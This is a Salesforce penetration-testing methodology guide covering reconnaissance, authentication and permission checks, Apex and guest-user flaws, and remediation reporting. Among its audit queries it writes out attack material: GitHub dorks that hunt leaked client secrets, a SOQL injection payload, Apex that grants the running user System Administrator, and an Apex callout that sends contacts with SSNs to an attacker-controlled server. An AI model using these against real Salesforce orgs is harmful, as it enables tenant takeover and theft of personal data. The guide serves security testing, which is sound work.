## Table of Contents
1.  [**Phase 1: Reconnaissance & Enumeration**](#1-phase-1-reconnaissance--enumeration)
2.  [**Phase 2: Identity & Authentication Attacks**](#2-phase-2-identity--authentication-attacks)
3.  [**Phase 3: Authorization & Access Control Exploitation (The Core)**](#3-phase-3-authorization--access-control-exploitation-the-core)
4.  [**Phase 4: Custom Code & Business Logic Flaws**](#4-phase-4-custom-code--business-logic-flaws)
5.  [**Phase 5: Experience Cloud (Community) & Guest User Exploitation**](#5-phase-5-experience-cloud-community--guest-user-exploitation)
6.  [**Phase 6: Advanced Exploitation & Data Exfiltration**](#6-phase-6-advanced-exploitation--data-exfiltration)
7.  [**Essential Tooling & Payloads**](#7-essential-tooling--payloads)
8.  [**Reporting & Remediation Guidance**](#8-reporting--remediation-guidance)

---

## 1. Phase 1: Reconnaissance & Enumeration

### 1.1 Unauthenticated Discovery
*   **Description:** Identify public-facing Salesforce assets without credentials.
*   **Method:**
    *   **Google/GitHub Dorking:**
        ```
        site:*.my.salesforce.com "Company Name"
        site:*.force.com "Company Name"
        inurl:"/s/login" site:company.com
        "sfdx auth url" "client_secret" site:github.com
        ```
    *   **Enumerate Subdomains:** Use tools like `subfinder` or `amass` to find domains like `community.company.com` or `partners.company.com` that might be CNAMEs to a Salesforce Experience Cloud.
*   **Impact:** Maps the external attack surface, identifies login portals, and may reveal leaked credentials or code.

### 1.2 Initial Org & User Context (Post-Auth)
*   **Description:** Understand your environment and privilege level from the inside.
*   **Method:**
    *   **UI Navigation:** Go to `Setup` > `Company Information`. Note the **Organization Edition** and **Instance**.
    *   **SOQL Queries (Developer Console or Workbench):**
        ```soql
        -- Get current user's profile and key permissions
        SELECT Id, Name, Profile.Name, (SELECT PermissionSet.Name, PermissionSet.IsOwnedByProfile FROM PermissionSetAssignments) FROM User WHERE Id = :UserInfo.getUserId()

        -- Check for "God Mode" permissions immediately
        SELECT Name FROM PermissionSet WHERE Id IN (SELECT PermissionSetId FROM PermissionSetAssignment WHERE AssigneeId = :UserInfo.getUserId()) AND (PermissionsModifyAllData = true OR PermissionsViewAllData = true OR PermissionsCustomizeApplication = true OR PermissionsAuthorApex = true)
        ```
*   **Impact:** Establishes a baseline for testing. Knowing your permissions is the first step to escalating them.

## 2. Phase 2: Identity & Authentication Attacks

### 2.1 Password Policy Weakness
*   **Description:** Exploiting weak password policies to facilitate brute-force or spraying attacks.
*   **Method:**
    *   **UI Navigation:** `Setup` > `Security` > `Password Policies`.
    *   **Check for:**
        *   Minimum Length < 12 characters
        *   No Complexity Requirement
        *   Lockout Threshold > 5 attempts
*   **Impact:** Increased likelihood of account takeover through password guessing or credential stuffing.

### 2.2 MFA Bypass
*   **Description:** Identifying users or scenarios where Multi-Factor Authentication is not enforced.
*   **Method:**
    *   **SOQL Query:** Find powerful users without MFA.
        ```soql
        SELECT u.Username, u.Profile.Name FROM User u WHERE u.Profile.PermissionsModifyAllData = true AND NOT EXISTS (SELECT Id FROM TwoFactorInfo WHERE UserId = u.Id)
        ```
    *   **API Login Test:** Attempt to log in via an API (e.g., using Postman or a Python script) with just a username and password. Weak configurations may not enforce MFA for API-only sessions.
*   **Impact:** Bypasses a critical security control, making high-privilege accounts vulnerable to simple credential compromise.

## 3. Phase 3: Authorization & Access Control Exploitation (The Core)

This is where the most critical Salesforce-specific vulnerabilities are found.

### 3.1 Vertical Privilege Escalation (Abusing "God Mode" Permissions)
*   **Description:** Identifying users or profiles with excessive administrative permissions.
*   **Method (SOQL):** Hunt for users assigned these permissions via their Profile or a Permission Set.
    ```soql
    -- Find users who can bypass all data sharing
    SELECT Assignee.Name, Assignee.Profile.Name FROM PermissionSetAssignment WHERE (PermissionSet.PermissionsModifyAllData = true OR PermissionSet.PermissionsViewAllData = true) AND Assignee.IsActive = true

    -- Find users who can alter the system configuration or code
    SELECT Assignee.Name, Assignee.Profile.Name FROM PermissionSetAssignment WHERE (PermissionSet.PermissionsCustomizeApplication = true OR PermissionSet.PermissionsAuthorApex = true) AND Assignee.IsActive = true
    ```
*   **Impact:** A single non-admin user with these rights can lead to a full tenant compromise, data theft, or malicious modification of business logic.

### 3.2 Horizontal Data Exposure (Sharing Model Flaws)
*   **Description:** Gaining access to records (e.g., Accounts, Cases) that a user should not see based on their role.
*   **Method:**
    *   **Check OWD:** `Setup` > `Security` > `Sharing Settings`. Look for any object with Org-Wide Defaults of `Public Read/Write`. This is an immediate, critical-risk finding.
    *   **Test for IDOR:** As a low-privilege user, obtain the 15 or 18-digit Record ID of a record owned by another user. Attempt to access it directly via the URL: `https://<instance>.lightning.force.com/lightning/r/<ObjectName>/<RECORD_ID>/view`. An "Insufficient Privileges" error is the expected secure behavior.
*   **Impact:** Allows sales reps to see competitor pipelines, support agents to see sensitive HR cases, leading to data leakage and business integrity issues.

## 4. Phase 4: Custom Code & Business Logic Flaws

### 4.1 SOQL Injection
*   **Description:** Exploiting dynamically constructed SOQL queries to bypass security controls.
*   **Method:**
    *   **Static Analysis (Code Review):** Search Apex code for `Database.query()` using string concatenation.
        ```apex
        // VULNERABLE:
        String query = 'SELECT Id, Name FROM Contact WHERE LastName = \'' + userInput + '\'';
        List<Contact> contacts = Database.query(query);

        // SECURE (Uses Bind Variable):
        List<Contact> contacts = [SELECT Id FROM Contact WHERE LastName = :userInput];
        ```
    *   **Dynamic Analysis:** In a search field, inject a single quote (`'`) or SOQL logic (`' OR Name != '`). A database error or an unexpectedly large result set indicates a vulnerability.
*   **Impact:** Full data extraction from any object, denial of service, or authentication bypass.

### 4.2 Insecure Apex Execution Context (`without sharing`)
*   **Description:** This is the most common and critical Salesforce code vulnerability. An Apex class running `without sharing` intentionally ignores all of the user's record-level sharing permissions, running in a "god mode" for data access.
*   **Method:**
    *   **Static Analysis:** Search the codebase for Apex classes declared as `public without sharing class` or with no sharing keyword specified in an `@AuraEnabled` context (which defaults to `without sharing`).
    *   **Dynamic Analysis (Burp Suite):** As a low-privilege user, perform an action via a custom component (e.g., save a record). If the action succeeds even though you lack the underlying permissions, the backing Apex code is running `without sharing`.
*   **Impact:** Critical privilege escalation. Allows a low-privilege user to read, create, or modify any record accessible to the system, completely bypassing the security model.

### 4.3 Cross-Site Scripting (XSS) in Visualforce/LWC
*   **Description:** Injecting malicious client-side scripts into custom UI components.
*   **Method:**
    *   **Visualforce:** Look for `<apex:outputText value="{!...}" escape="false" />`.
    *   **Lightning (LWC/Aura):** Look for direct DOM manipulation (`element.innerHTML = ...`) or use of `lwc:dom="manual"`.
*   **Impact:** Session hijacking, credential theft, performing actions on behalf of the victim.

## 5. Phase 5: Experience Cloud (Community) & Guest User Exploitation

### 5.1 Over-Privileged Guest User
*   **Description:** The unauthenticated "Guest User" has excessive permissions, allowing public access to internal data. This is a top source of data breaches on the platform.
*   **Method:**
    *   **UI Navigation:** `Setup` > `Digital Experiences` > `All Sites`. For each a site, click `Workspaces` > `Administration` > `Pages` > `Go to Force.com` and click **Public Access Settings**.
    *   **Check Permissions:** In the Guest User's Profile, review "Object Settings". This profile should have **NO** access to standard objects like Account, Contact, or User by default. Any `Read` or `View` access is a potential high-risk finding.
*   **Impact:** Anonymous, unauthenticated data exfiltration of customer lists, user details, and sensitive business data.

### 5.2 Guest User Sharing Rule Bypass
*   **Description:** Even with a locked-down profile, guest users can see records if a misconfigured Sharing Rule grants access to records owned by the guest.
*   **Method:**
    *   **UI Navigation:** In `Setup` > `Security` > `Sharing Settings`, enable the setting **`Secure guest user record access`**. If this is disabled, it is a critical finding.
    *   **Test for IDORs:** As an unauthenticated guest user browsing the community, attempt to access internal record IDs.
*   **Impact:** Allows unauthenticated users to view specific records that have been unintentionally shared with the public.

## 6. Phase 6: Advanced Exploitation & Data Exfiltration

### 6.1 Full Org Takeover via `Author Apex`
*   **Description:** A user with the `Author Apex` permission can execute arbitrary code and grant themselves System Administrator rights.
*   **Method (`Execute Anonymous` in Developer Console):**
    ```apex
    // Find the System Administrator profile
    Profile p = [SELECT Id FROM Profile WHERE Name='System Administrator'];

    // Get the current user
    User u = [SELECT Id FROM User WHERE Id = :UserInfo.getUserId()];

    // Assign the System Administrator profile to self
    u.ProfileId = p.Id;
    update u;
    ```
*   **Impact:** Complete, persistent compromise of the Salesforce tenant.

### 6.2 Covert Data Exfiltration via Callouts
*   **Description:** Using Apex code to send sensitive data to an external, attacker-controlled server.
*   **Method (`Execute Anonymous` or in a Trigger):**
    ```apex
    // Query sensitive data
    List<Contact> sensitiveContacts = [SELECT Name, Email, SSN__c FROM Contact LIMIT 10];

    // Prepare the exfiltration request
    HttpRequest req = new HttpRequest();
    req.setEndpoint('https://attacker-controlled-server.com/log'); // Your Burp Collaborator or server
    req.setMethod('POST');
    req.setHeader('Content-Type', 'application/json');
    req.setBody(JSON.serialize(sensitiveContacts));

    // Send the data
    new Http().send(req);
    ```
*   **Impact:** Covert, large-scale data theft that bypasses standard Salesforce event monitoring.

## 7. Essential Tooling & Payloads

*   **Browser Extensions:**
    *   **Salesforce Inspector:** Absolutely essential for on-the-fly data and metadata inspection.
    *   **Salesforce Advanced Code Searcher:** Quickly search an org's codebase.
*   **Web & API Testing:**
    *   **Burp Suite Professional:** Mandatory for intercepting and manipulating `/aura`, `/apexremote`, and API traffic.
    *   **Workbench:** A powerful web-based tool for SOQL queries, REST API exploration, and metadata browsing.
*   **CLI & Static Analysis:**
    *   **Salesforce CLI (SFDX):** For retrieving metadata (code, profiles, etc.) for offline analysis.
    *   **PMD Source Code Analyzer:** Use with the Apex rule set to find security flaws in downloaded code.
*   **Go-To SOQLi Payload:**
    `' OR Name != '` (classic boolean-based test)

## 8. Reporting & Remediation Guidance

*   **Prioritize by Impact:** Don't just report "SOQL Injection." Report "Authenticated Sales User Can Exfiltrate All Customer PII via SOQL Injection in Search Component."
*   **Provide Actionable Fixes:**
    *   **For Code:** Provide the exact line number and the secure coding alternative (e.g., "Replace `Database.query()` with a static query using bind variables.").
    *   **For Permissions:** Recommend creating granular Permission Sets following the Principle of Least Privilege. Advise against cloning the "System Administrator" profile.
    *   **For Configuration:** Provide the exact navigation path in `Setup` and the setting to change (e.g., "In Sharing Settings, set the OWD for the `Case` object to `Private`.").
*   **Reference Official Docs:** Link to Salesforce help articles or security guides to add credibility and assist the development team.